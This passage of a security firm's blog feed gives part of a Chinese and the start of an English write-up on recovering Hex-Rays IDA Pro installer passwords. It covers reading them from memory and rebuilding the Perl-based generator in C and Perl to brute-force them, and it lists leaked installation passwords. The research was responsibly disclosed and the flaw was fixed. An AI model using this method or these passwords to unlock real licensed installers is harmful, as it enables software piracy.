                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大約一個月的運算，我們終於成功利用 Perl 亂數產生出 IDA Pro 的安裝密碼，而正確的字元組順序為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;。例如 hacking team 洩漏的 IDA Pro 6.8 安裝密碼是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt;，就可用下面程式碼產生：&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&quot;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;透過這些資訊，我們可以建立一個用來暴力列舉安裝密碼的字典檔，縮短暴力列舉的時間，實作方式可參考 &lt;a href=&quot;https://github.com/kholia/inno2john&quot;&gt;inno2john&lt;/a&gt; 專案。在一般情況下，約十分鐘即可算出 windows 安裝檔的安裝密碼。&lt;/p&gt;

&lt;p&gt;在回報 Hex-Rays 後，他們立刻表示之後將會使用更安全的安裝密碼。&lt;/p&gt;

&lt;h2 id=&quot;總結&quot;&gt;總結&lt;/h2&gt;

&lt;p&gt;本篇文章提出了一個開放性問題：在未知安裝密碼的情況下可不可以安裝 IDA Pro？結果我們在 Linux 以及 MacOS 版發現可以從記憶體中取得明文密碼。而在 Windows 版本中，我們黑箱找到了安裝密碼產生的方式，因此我們可以建立一份字典檔，用以縮短暴力列舉安裝密碼的時間，最終，我們約十分鐘可解出一組密碼，是一個可以接受的時間。&lt;/p&gt;

&lt;p&gt;我們真的很喜歡這樣的過程：有根據的大膽猜測，竭盡全力用任何已知資訊去證明我們的想法，不論猜測是對是錯，都能從過程中獲得很多經驗。這也是為什麼我們這次願意花一個月時間去驗證一個成功機率不是很高的假設。附帶一提，這樣的態度，也被運用在我們&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;紅隊演練&lt;/a&gt;上，想要試試嗎 :p&lt;/p&gt;

&lt;p&gt;寫在最後，要感謝 Hex-Rays 很友善且快速的回應。即使這個問題不包含在 &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt; 裡面，仍然慷慨的贈送 Linux 和 MAC 版 IDA 及升級原有 Windows 版至 IDA Pro。再次感謝。&lt;/p&gt;

&lt;h2 id=&quot;時間軸&quot;&gt;時間軸&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - 向 Hex-Rays 回報弱點&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays 說明之後會增加安裝密碼的強度，並協助通報 BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock 釋出了 InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Today, we are going to talk about the installation password of Hex-Rays IDA Pro, which is the most famous decompiler. What is installation password? Generally, customers receive a custom installer and installation password after they purchase IDA Pro. The installation password is required during installation process. However, if someday we find a leaked IDA Pro installer, is it still possible to install without an installation password? This is an interesting topic.&lt;/p&gt;

&lt;p&gt;After brainstorming with our team members, we verified the answer: Yes! With a Linux or MacOS version installer, we can easily find the password directly. With a Windows version installer, we only need 10 minutes to calculate the password. The following is the detailed process:&lt;/p&gt;

&lt;h3 id=&quot;-linux-and-macos-version&quot;&gt;* Linux and MacOS version&lt;/h3&gt;

&lt;p&gt;The first challenge is Linux and MacOS version. The installer is built with an installer creation tool called InstallBuilder. We found the plaintext installation password directly in the program memory of the running IDA Pro installer. Mission complete!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190621/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This problem is fixed after we reported through Hex-Rays. &lt;a href=&quot;https://blog.bitrock.com/2019/02/installbuilder-1920-released.html&quot;&gt;BitRock&lt;/a&gt; released InstallBuilder 19.2.0 with the protection of installation password on 2019/02/11.&lt;/p&gt;

&lt;h3 id=&quot;-windows-version&quot;&gt;* Windows version&lt;/h3&gt;

&lt;p&gt;It gets harder on Windows version because the installer is built with &lt;a href=&quot;http://www.jrsoftware.org/isinfo.php&quot;&gt;Inno Setup&lt;/a&gt;, which store its password with &lt;a href=&quot;http://www.jrsoftware.org/ishelp/index.php?topic=setup_password&quot;&gt;160-bit SHA-1 hash&lt;/a&gt;. Therefore, we cannot get the password simply with static or dynamic analyzing the installer, and brute force is apparently not an effective way. But the situation is different if we can grasp the methodology of password generation, which lets us enumerate the password more effectively!&lt;/p&gt;

&lt;p&gt;Although we have realized we need to find how Hex-Rays generate password, it is still really difficult, as we do not know what language the random number generator is implemented with. There are at least &lt;a href=&quot;https://rosettacode.org/wiki/Random_number_generator_(included)&quot;&gt;88 random number generators&lt;/a&gt; known. It is such a great variation.&lt;/p&gt;

&lt;p&gt;We first tried to find the charset used by random number generator. We collected all leaked installation passwords, such as hacking team’s password, which is leaked by WikiLeaks.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FgVQyXZY2XFk (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62729&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;7ChFzSbF4aik (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/311769&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;ZFdLqEM2QMVe (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/62956&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;6VYGSyLguBfi (&lt;a href=&quot;https://wikileaks.org/hackingteam/emails/emailid/70250&quot;&gt;link&lt;/a&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From the collected passwords we can summarize the charset:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The missing of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;I&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;l&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;O&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;o&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;N&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n&lt;/code&gt; seems to make sense because they are confusing characters.
Next, we guess the possible charset ordering like these:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz
ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz
23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ
abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789
ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lastly, we picked some common languages（c/php/python/perl）to implement a random number generator and enumerate all the combinations. Then we examined whether the collected passwords appears in the combinations. For example, here is a generator written in C language:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt;&lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZ23456789abcdefghijkmpqrstuvwxyz&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;23456789abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyz23456789ABCDEFGHJKLMPQRSTUVWXYZ&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ABCDEFGHJKLMPQRSTUVWXYZabcdefghijkmpqrstuvwxyz23456789&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufa&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bufe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
